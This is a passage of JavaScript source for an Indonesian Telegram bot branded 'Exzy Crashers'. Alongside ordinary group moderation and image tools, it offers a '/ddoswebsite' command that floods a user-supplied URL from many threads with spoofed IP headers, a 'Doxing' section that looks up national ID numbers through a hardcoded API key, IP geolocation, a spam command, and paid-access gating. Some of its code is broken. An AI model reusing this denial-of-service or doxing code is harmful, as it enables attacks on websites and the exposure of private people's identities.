      if (e.type === 'mention') return text.substring(e.offset + 1, e.offset + e.length);
    }
    return null;
  };

  const fromText = check(msg.entities, msg.text);
  if (fromText) return fromText;

  const fromCaption = check(msg.caption_entities, msg.caption);
  if (fromCaption) return fromCaption;

  return null;
}

async function resolveUsername(bot, chatId, username) {
  try {
    const members = await bot.getChatAdministrators(chatId)
    const found = members.find(m => m.user.username?.toLowerCase() === username.toLowerCase())
    return found ? found.user.id : null
  } catch {
    return null
  }
}

bot.onText(/^\/promote/, async (msg) => {
  if (!onlyGroup(msg, bot)) return;
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")

  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }

  try {
    await bot.promoteChatMember(chatId, target, {
      can_manage_chat: true,
      can_delete_messages: true,
      can_invite_users: true,
      can_restrict_members: true
    })
    bot.sendMessage(chatId, "Promoted !")
  } catch(e) {
    bot.sendMessage(chatId, "Gagal promote" + e)
  }
})

bot.onText(/^\/demote/, async (msg) => {
  if (!onlyGroup(msg, bot)) return;
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")

  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }

  try {
    await bot.promoteChatMember(chatId, target, {
      can_manage_chat: false,
      can_delete_messages: false,
      can_invite_users: false,
      can_restrict_members: false
    })
    bot.sendMessage(chatId, "Demoted !")
  } catch(e) {
    bot.sendMessage(chatId, "Gagal demote" + e)
  }
})

bot.onText(/^\/mute/, async (msg) => {
  if (!onlyGroup(msg, bot)) return;
  if (!msg.chat.type.includes("group")) return;
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;
  
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  try {
    await bot.restrictChatMember(chatId, target, {
      permissions: {
        can_send_messages: false,
        can_send_media_messages: false,
        can_send_polls: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false,
        can_change_info: false,
        can_invite_users: false,
        can_pin_messages: false,
      },
    });
    await bot.sendMessage(chatId, `User ${reply.from.first_name} Telah Di Mute !.`);
  } catch (e) {
    await bot.sendMessage(chatId, `❌ ⵢ Gagal mute user: ${e.message}`);
  }
});

bot.onText(/^\/unmute/, async (msg) => {
  if (!onlyGroup(msg, bot)) return;
  if (!msg.chat.type.includes("group")) return;
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;
  
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  try {
    await bot.restrictChatMember(chatId, target, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: true,
        can_pin_messages: false,
      },
    });
    await bot.sendMessage(chatId, `User ${reply.from.first_name} Telah Di Unmute !.`);
  } catch (e) {
    await bot.sendMessage(chatId, `❌ ⵢ Gagal unmute user: ${e.message}`);
  }
});

bot.onText(/^\/kick/, async (msg) => {
  if (!onlyGroup(msg, bot)) return;
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")

  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }

  try {
    await bot.banChatMember(chatId, target)
    await bot.unbanChatMember(chatId, target)
    bot.sendMessage(chatId, "User Kick !")
  } catch {
    bot.sendMessage(chatId, "Gagal kick")
  }
})

bot.onText(/^\/ban/, async (msg) => {
  if (!onlyGroup(msg, bot)) return;
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")

  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }

  try {
    await bot.banChatMember(chatId, target)
    bot.sendMessage(chatId, "User Banned !")
  } catch(e) {
    bot.sendMessage(chatId, "Gagal ban" + e)
  }
})

bot.onText(/^\/unban/, async (msg) => {
  if (!onlyGroup(msg, bot)) return;
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")

  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }

  try {
    await bot.unbanChatMember(chatId, target)
    bot.sendMessage(chatId, "User Unbanned !")
  } catch {
    bot.sendMessage(chatId, "Gagal unban")
  }
})

bot.onText(/^\/warn$/i, async (msg) => {
  if (!onlyGroup(msg, bot)) return;
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const reply = msg.reply_to_message
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }
  ensure(chatId)
  const uid = reply.from.id
  data[chatId].warns[uid] = (data[chatId].warns[uid] || 0) + 1
  const cnt = data[chatId].warns[uid]
  if (cnt >= 3) {
    try {
      await bot.kickChatMember(chatId, uid)
      data[chatId].warns[uid] = 0
      await bot.sendMessage(chatId, `${reply.from.first_name} dikick karena 3 warn`, { reply_markup: { inline_keyboard: [[{ text: "Unban", callback_data: "unban_" + uid }]] } })
    } catch { await bot.sendMessage(chatId, "Gagal kick") }
  } else {
    await bot.sendMessage(chatId, `${reply.from.first_name} mendapat warn (${cnt}/3)`, { reply_markup: { inline_keyboard: [[{ text: "Unwarn", callback_data: "unwarn_" + uid }, { text: "Remove Warn", callback_data: "clear_warn_" + uid }]] } })
  }
})

bot.onText(/^\/unwarn$/i, async (msg) => {
  if (!onlyGroup(msg, bot)) return;
  const chatId = msg.chat.id
  const fromId = msg.from.id
  const reply = msg.reply_to_message
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }
  ensure(chatId)
  const uid = reply.from.id
  if (!data[chatId].warns[uid] || data[chatId].warns[uid] <= 0) return bot.sendMessage(chatId, "User tidak punya warn")
  data[chatId].warns[uid] -= 1
  await bot.sendMessage(chatId, `Warn berkurang (${data[chatId].warns[uid]}/3)`, { reply_markup: { inline_keyboard: [[{ text: "Remove Warn", callback_data: "clear_warn_" + uid }]] } })
})

bot.onText(/^\/pin$/i, async (msg) => {
  if (!onlyGroup(msg, bot)) return;
  const chatId = msg.chat.id
  const reply = msg.reply_to_message
  const fromId = msg.from.id
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  let target = getTarget(msg)
  if (!target) return bot.sendMessage(chatId, "❌ ⵢ Mention / Reply Message Users ")

  if (typeof target === "string") {
    target = await resolveUsername(bot, chatId, target)
    if (!target) return bot.sendMessage(chatId, "Username tidak ditemukan")
  }
  try {
    await bot.pinChatMessage(chatId, reply.message_id)
    await bot.sendMessage(chatId, "Pinned!", { reply_markup: { inline_keyboard: [[{ text: "Unpin Message", callback_data: "unpin" }]] } })
  } catch { await bot.sendMessage(chatId, "Gagal pin") }
})

// Doxing

bot.onText(/^\/nikparse(?:\s+(.+))?$/i, async (msg, match) => {
  const args = (match[1] || "").split(" ");
  const nik = args[0];

  if (!nik) {
    return bot.sendMessage(msg.chat.id, "❌ ⵢ Format : /nikparse 3510243006730004");
  }

  try {
    const waitMsg = await bot.sendMessage(msg.chat.id, "Process Search NIK...");

    const response = await axios.get(
      `https://nik-parser.p.rapidapi.com/ektp?nik=${nik}`,
      {
        headers: {
          'x-rapidapi-host': 'nik-parser.p.rapidapi.com',
          'x-rapidapi-key': '972f5c568dmsh552ff4877326665p1b6e67jsn290d2652a173'
        },
        timeout: 15000
      }
    );

    const result = response.data;

    try {
      await bot.deleteMessage(msg.chat.id, waitMsg.message_id);
    } catch (e) {}

    if (result.errCode !== 0) {
      return bot.sendMessage(msg.chat.id, `Gagal parsing NIK: ${result.errMessage || 'Unknown error'}`);
    }

    const data = result.data;

    let caption = `<blockquote><b>¡ ᬊ 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 ¡</b></blockquote>\n\n`;
    caption += `┃☰. - NIK: ${nik}\n\n`;
    caption += `〢-╰➤ ° ↯ Provinsi: ${data.province || 'Tidak diketahui'}\n`;
    caption += `┃☰. - Kota/Kab: ${data.city || 'Tidak diketahui'}\n`;
    caption += `〢-╰➤ ° ↯ Kecamatan: ${data.district || 'Tidak diketahui'}\n`;
    caption += `┃☰. - Kode Pos: ${data.zipcode || 'Tidak diketahui'}\n\n`;
    caption += `〢-╰➤ ° ↯ Jenis Kelamin: ${data.gender || 'Tidak diketahui'}\n`;
    caption += `┃☰. - Tanggal Lahir: ${data.birthdate || 'Tidak diketahui'}\n`;
    caption += `〢-╰➤ ° ↯ Uniq Code: ${data.uniqcode || 'Tidak diketahui'}`,
       { parse_mode: "HTML" }
       await bot.sendMessage(msg.chat.id `${caption}`);

  } catch (error) {
    console.error('NIK Parse error:', error.response?.data || error.message);
    
    let errorMessage = 'Gagal parsing NIK\n\n';
    
    if (error.response) {
      if (error.response.status === 400) {
        errorMessage += 'NIK tidak valid';
      } else {
        errorMessage += `Status: ${error.response.status}`;
      }
    } else if (error.code === 'ECONNABORTED') {
      errorMessage += 'Timeout: Request terlalu lama';
    } else {
      errorMessage += `Error: ${error.message}`;
    }
    
    await bot.sendMessage(msg.chat.id, `${errorMessage}`);
  }
});

bot.onText(/^\/trackip(?:\s+(.+))?/,  async (msg, match) => {
    const chatId = msg.chat.id;
    const args = msg.text.split(" ").filter(Boolean);
    if (!args[1]) return bot.sendMessage(chatId, "❌ ⵢ Missing Input\nExample: /trackip 8.8.8.8");

    const ip = args[1].trim();

    function isValidIPv4(ip) {
      const parts = ip.split(".");
      if (parts.length !== 4) return false;
      return parts.every((p) => {
        if (!/^\d{1,3}$/.test(p)) return false;
        if (p.length > 1 && p.startsWith("0")) return false;
        const n = Number(p);
        return n >= 0 && n <= 255;
      });
    }

    function isValidIPv6(ip) {
      const ipv6Regex =
        /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
      return ipv6Regex.test(ip);
    }

    if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
      return bot.sendMessage(
        chatId,
        "❌ ⵢ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar"
      );
    }

    const processingMsg = await bot.sendMessage(
      chatId,
      `🔎 ⵢ Tracking IP ${ip} — sedang memproses`
    );
         
    try {
      const res = await axios.get(
        `https://ipwhois.app/json/${encodeURIComponent(ip)}`,
        { timeout: 10000 }
      );
      const data = res.data;

      if (!data || data.success === false) {
        return bot.sendMessage(chatId, `❌ ⵢ Gagal mendapatkan data untuk IP: ${ip}`);
      }

      const lat = data.latitude || "";
      const lon = data.longitude || "";
      const mapsUrl =
        lat && lon
          ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(
              lat + "," + lon
            )}` : null;

      const caption = `
<blockquote><b>─ ¡ ᬊ 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 ¡ ─</b></blockquote>
┃☰. - IP: ${data.ip || "-"}
〢-╰➤ ° ↯ Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
┃☰. - Region: ${data.region || "-"}
〢-╰➤ ° ↯ City: ${data.city || "-"}
┃☰. - ZIP: ${data.postal || "-"}
〢-╰➤ ° ↯ Timezone: ${data.timezone_gmt || "-"}
┃☰. - ISP: ${data.isp || "-"}
〢-╰➤ ° ↯ Org: ${data.org || "-"}
┃☰. - ASN: ${data.asn || "-"}
〢-╰➤ ° ↯ Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

      const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🌍 ⵢ Location", url: mapsUrl }]
        ]
      }
    } : null;

      try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await bot.editMessageText(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof imageThumbnail !== "undefined" && imageThumbnail) {
        await bot.sendPhoto(imageThumbnail, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await bot.sendMessage(msg.chat.id, caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await bot.sendMessage(msg.chat.id, caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      console.log(e)
    }

  } catch (err) {
    await bot.sendMessage(msg.chat.id, "❌ ⵢ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti" + err);
  }
});

// Tools V1-V2
bot.onText(/^\/update$/, async (msg) => {
  const chatId = msg.chat.id
  const userId = msg.from.id

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://t.me/yteamlowhh" }]
        ]
      }
    });
  }

  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId, "❌ ⵢ Balas ke file .js atau package.json yang ingin diupdate, lalu kirim /update")
  }

  const file = msg.reply_to_message.document
  const fileName = file.file_name

  if (!fileName.endsWith(".js") && fileName !== "package.json") {
    return bot.sendMessage(chatId, "❌ ⵢ File harus berekstensi .js atau bernama package.json")
  }

  try {
    const fileLink = await bot.getFileLink(file.file_id)
    const filePath = path.join(__dirname, fileName)

    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath)
      bot.sendMessage(chatId, `🗑️ ⵢ Old Files *${fileName}* Delete.`, { parse_mode: "Markdown" })
    }

    const fileStream = fs.createWriteStream(filePath)
    https.get(fileLink, (response) => {
      response.pipe(fileStream)
      fileStream.on("finish", () => {
        fileStream.close()
        bot.sendMessage(chatId, `✅ ⵢ File *${fileName}* Updated !`, { parse_mode: "Markdown" })
        if (fileName === "exzyybakap.js" || fileName === "package.json") {
          bot.sendMessage(chatId, `♻️ ⵢ File penting diperbarui (${fileName}) — Bot akan restart...`, { parse_mode: "Markdown" })
          setTimeout(() => {
            exec("pm2 restart all || npm restart || node exzyybakap.js", (err) => {
              if (err) console.error("Gagal restart bot:", err.message)
            })
          }, 2000)
        }
      })
    }).on("error", (err) => {
      bot.sendMessage(chatId, `❌ ⵢ Gagal mengunduh file: ${err.message}`)
    })
  } catch (err) {
    bot.sendMessage(chatId, `❌ ⵢ Terjadi kesalahan: ${err.message}`)
  }
})

bot.onText(/^\/ddoswebsite(?:\s+(.+))?$/i, async (msg, match) => {
  try {
  const args = (msg.text || "").split(" ").slice(1).join(" ").trim();
    if (!args) {
      return bot.sendMessage(msg.chat.id, "❌ ⵢ Format: /ddoswebsite https://target.com 1000");
    }

    const [target_url, rawThreads] = args.split(" ");
    const threads = parseInt(rawThreads) || 50;

    const processMsg = await bot.sendMessage(msg.chat.id, `<blockquote><b>─ ¡ ᬊ 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 ¡ ─</b></blockquote>
┃☰. - Target
〢-╰➤ ° ↯  ${target_url}
┃☰. - Threads
〢-╰➤ ° ↯  ${threads}
┃☰. - Status
〢-╰➤ ° ↯  Process
`, { parse_mode: "HTML" });

    const attackConfig = {
      threads: threads,
      duration: 60000,
      requestsPerThread: 1000,
      userAgents: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36"
      ],
      methods: ["GET", "POST", "HEAD", "OPTIONS"]
    };

    let totalRequests = 0;
    let successfulAttacks = 0;
    const startTime = Date.now();

    const attackPromises = [];

    for (let i = 0; i < attackConfig.threads; i++) {
      attackPromises.push(new Promise(async (resolve) => {
        let threadRequests = 0;
        
        while (Date.now() - startTime < attackConfig.duration && threadRequests < attackConfig.requestsPerThread) {
          try {
            const method = attackConfig.methods[Math.floor(Math.random() * attackConfig.methods.length)];
            const userAgent = attackConfig.userAgents[Math.floor(Math.random() * attackConfig.userAgents.length)];
            const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

            const headers = {
              "X-Forwarded-For": ip,
              "X-Real-IP": ip,
              "User-Agent": userAgent,
              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              "Connection": "keep-alive",
              "Upgrade-Insecure-Requests": "1",
              "Cache-Control": "no-cache",
              "Pragma": "no-cache"
            };

            const randomPaths = ["/", "/admin", "/wp-admin", "/api", "/test", "/debug"];
            const randomPath = randomPaths[Math.floor(Math.random() * randomPaths.length)];
            const attackUrl = target_url + randomPath;

            const response = await axios({
              method: method,
              url: attackUrl,
              headers: headers,
              timeout: 5000,
              validateStatus: () => true
            });

            totalRequests++;
            threadRequests++;
            
            if (response.status < 500) {
              successfulAttacks++;
            }

            if (totalRequests % 100 === 0) {
              const elapsed = Math.floor((Date.now() - startTime) / 1000);
              await bot.editMessageText(
                `<blockquote><b>─ ¡ ᬊ 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 ¡ ─</b></blockquote>
┃☰. - Target
〢-╰➤ ° ↯  ${target_url}
┃☰. - Threads
〢-╰➤ ° ↯  ${attackConfig.threads}
┃☰. - Requests
〢-╰➤ ° ↯  ${totalRequests}
┃☰. - Success
〢-╰➤ ° ↯  ${successfulAttacks}
┃☰. - Duration
〢-╰➤ ° ↯  ${elapsed}s
┃☰. - Status
〢-╰➤ ° ↯  Running
`,
                {
                  chat_id: msg.chat.id,
                  message_id: processMsg.message_id,
                  parse_mode: "HTML"
                }
              );
            }

            await new Promise(r => setTimeout(r, Math.random() * 100));

          } catch (error) {
            threadRequests++;
            totalRequests++;
          }
        }
        resolve();
      }));
    }

    await Promise.all(attackPromises);

    const endTime = Date.now();
    const totalDuration = Math.floor((endTime - startTime) / 1000);

    await bot.editMessageText(
      `<blockquote><b>─ ¡ ᬊ 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 ¡ ─</b></blockquote>
┃☰. - Target
〢-╰➤ ° ↯  ${target_url}
┃☰. - Threads
〢-╰➤ ° ↯  ${attackConfig.threads}
┃☰. - Total Requests
〢-╰➤ ° ↯  ${totalRequests}
┃☰. - Successful
〢-╰➤ ° ↯  ${successfulAttacks}
┃☰. - Total Duration
〢-╰➤ ° ↯  ${totalDuration}s
┃☰. - Requests/Sec
〢-╰➤ ° ↯  ${Math.floor(totalRequests / totalDuration)}
┃☰. - Status
〢-╰➤ ° ↯  Completed
`,
      {
        chat_id: msg.chat.id,
        message_id: processMsg.message_id,
        parse_mode: "HTML"
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, "❌ ⵢ Gagal melakukan serangan ddos" + error);
  }
});

bot.onText(/^\/broadcast(?:\s+([\s\S]+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const text = match[1];

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://t.me/yteamlowhh" }]
        ]
      }
    });
  }

  if (!text) {
    return bot.sendMessage(chatId, "Gunakan format:\n`/broadcast <pesan>`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, `Mengirim Pesan ke ${users.size} pengguna...`, { parse_mode: "Markdown" });

  let success = 0;
  let fail = 0;

  for (const userId of users) {
    try {
      await bot.sendMessage(userId, `
<blockquote>Broadcast From Admin [ 𖥊 ]</blockquote>
#- Message : ${text}`, { parse_mode: "HTML" });
      success++;
    } catch {
      fail++;
    }
  }

  await bot.sendMessage(chatId, `Pesan selesai!\n\nTerkirim: ${success}\nGagal: ${fail}`);
});

bot.onText(/^\/chatowner (.+)/, async (msg, match) => {
  const text = match[1];
  bot.sendMessage(OWNER_ID, "From User:\n" + text)
  bot.sendMessage(msg.chat.id, "Succes Chat Owner !.")
})

async function getFileBuffer(fileId, bot) {
  const link = await bot.getFileLink(fileId)
  const res = await axios.get(link, { responseType: "arraybuffer" })
  return Buffer.from(res.data)
}

async function getFileUrl(fileId) {
  const file = await bot.getFile(fileId)
  return `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`
}

async function downloadToFile(fileUrl, outPath) {
  const res = await axios.get(fileUrl, { responseType: "stream", timeout: 120000 })
  await streamPipeline(res.data, fs.createWriteStream(outPath))
  return outPath
}

async function downloadBuffer(fileUrl) {
  const res = await axios.get(fileUrl, { responseType: "arraybuffer", timeout: 120000 })
  return Buffer.from(res.data)
}

function tmpPath(ext = "") {
  return path.join(process.cwd(), "tmp_" + uuidv4() + (ext ? ("." + ext) : ""))
}

async function getMediaFromMessage(msg) {
  if (msg.photo) {
    const p = msg.photo[msg.photo.length - 1]
    return { type: "photo", fileId: p.file_id }
  }
  if (msg.video) {
    return { type: "video", fileId: msg.video.file_id }
  }
  if (msg.document && msg.document.mime_type && msg.document.mime_type.startsWith("image")) {
    return { type: "document", fileId: msg.document.file_id }
  }
  if (msg.reply_to_message) {
    const rm = msg.reply_to_message
    if (rm.photo) {
      const p = rm.photo[rm.photo.length - 1]
      return { type: "photo", fileId: p.file_id }
    }
    if (rm.video) {
      return { type: "video", fileId: rm.video.file_id }
    }
    if (rm.document && rm.document.mime_type && rm.document.mime_type.startsWith("image")) {
      return { type: "document", fileId: rm.document.file_id }
    }
  }
  return null
}

async function upscaleSharp(buffer, scale = 2) {
  const img = sharp(buffer)
  const meta = await img.metadata()
  const width = meta.width ? Math.round(meta.width * scale) : null
  if (!width) return null
  const out = await img.resize({ width, withoutEnlargement: false, kernel: sharp.kernel.lanczos3 }).toBuffer()
  return out
}

async function makeSticker(buffer) {
  const out = await sharp(buffer).resize(512, 512, { fit: "cover" }).webp().toBuffer()
  return out
}

async function addWatermark(buffer, text) {
  const meta = await sharp(buffer).metadata()
  const svg = `<svg width="${meta.width}" height="${meta.height}"><style>.a{fill:white;font-size:48px;font-weight:700;stroke:black;stroke-width:2px;}</style><text x="${Math.max(10, Math.floor(meta.width*0.02))}" y="${meta.height - Math.max(10, Math.floor(meta.height*0.02))}" class="a">${text}</text></svg>`
  const out = await sharp(buffer).composite([{ input: Buffer.from(svg), gravity: "southeast" }]).toBuffer()
  return out
}

function downloadFile(url, outputPath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(outputPath)
    https.get(url, (res) => {
      res.pipe(file)
      file.on("finish", () => file.close(() => resolve(true)))
    }).on("error", (err) => {
      fs.unlinkSync(outputPath)
      reject(err)
    })
  })
}

bot.on("message", async msg => {
  try {
    const chatId = msg.chat.id
    const textRaw = (msg.text || msg.caption || "").trim()
    if (!textRaw) return
    const parts = textRaw.split(" ")
    const cmd = parts[0].toLowerCase()
    const arg = parts.slice(1).join(" ").trim()
    const media = await getMediaFromMessage(msg)
    
   if (msg.text === "/removebg") {
    return bot.sendMessage(chatId, "❌ ⵢ Format : Reply Media Dengan Caption /removebg")
  }

  if (msg.photo) {
    try {
      const fileId = msg.photo[msg.photo.length - 1].file_id
      const file = await bot.getFile(fileId)

      const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`
      const inputPath = "input_removebg.png"
      const outputPath = "removebg_result.png"

      await downloadFile(fileUrl, inputPath)

      await sharp(inputPath)
        .removeAlpha()
        .threshold(200)
        .png()
        .toFile(outputPath)

      await bot.sendPhoto(chatId, outputPath, {
        caption: "✅ ⵢ Remove Bg By 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 ( 🍁 )"
      })

      fs.unlinkSync(inputPath)
      fs.unlinkSync(outputPath)

    } catch(e) {
      bot.sendMessage(chatId, "❌ ⵢ Terjadi error saat memproses foto." + e)
    }
  }
    if (cmd === "/sticker" || cmd === "/stiker") {
      if (!media) {
        await bot.sendMessage(chatId, "❌ ⵢ Format : Reply Media / Kirim Media Dengan Caption /sticker")
        return
      }
      const fileUrl = await getFileUrl(media.fileId)
      const buf = await downloadBuffer(fileUrl)
      const webp = await makeSticker(buf)
      await bot.sendSticker(chatId, webp)
      return
    }
    if (cmd === "/watermark" || cmd === "/wm") {
      if (!arg) {
        await bot.sendMessage(chatId, "Tambahkan teks watermark setelah perintah, contoh: /watermark zellx")
        return
      }
      if (!media) {
        await bot.sendMessage(chatId, "❌ ⵢ Format : Reply Media / Kirim Media Dengan Caption /watermark teks")
        return
      }
      const fileUrl = await getFileUrl(media.fileId)
      const buf = await downloadBuffer(fileUrl)
      const out = await addWatermark(buf, arg)
      await bot.sendPhoto(chatId, out)
      return
    }
  } catch (e) {
    try { await bot.sendMessage(msg.chat.id, "Terjadi kesalahan saat memproses") } catch {}
  }
})

const MAIN_FILE = "./exzyybakap.js";

bot.onText(/^\/addfiture$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const messageId = msg.message_id;
  
  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://t.me/yteamlowhh" }]
        ]
      }
    });
  }

  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, "❌ ⵢ Reply ke case text atau file .js yang ingin ditambahkan.");
  }

  let newCase = "";

  if (msg.reply_to_message.text) {
    newCase = msg.reply_to_message.text;
  }

  if (msg.reply_to_message.document) {
    const file = await bot.getFile(msg.reply_to_message.document.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
    const res = await fetch(fileUrl);
    newCase = await res.text();
  }

  if (!newCase) {
    return bot.sendMessage(chatId, "❌ ⵢ Gagal mendapatkan case dari reply.");
  }

  try {
    const appendText = `\n\n${newCase}\n`;
    fs.appendFileSync(MAIN_FILE, appendText, "utf8");

    await bot.sendMessage(chatId, "✅ ⵢ Case berhasil ditambahkan ke exzyybakap.js!\nPlease Type /restart.", {
      reply_to_message_id: messageId
    });

  } catch (err) {
    bot.sendMessage(chatId, "⚠️ ⵢ Terjadi kesalahan: " + err.message);
  }
});

bot.onText(/^\/spamngl(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const args = match[1] ? match[1].split(" ") : [];

  try {
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
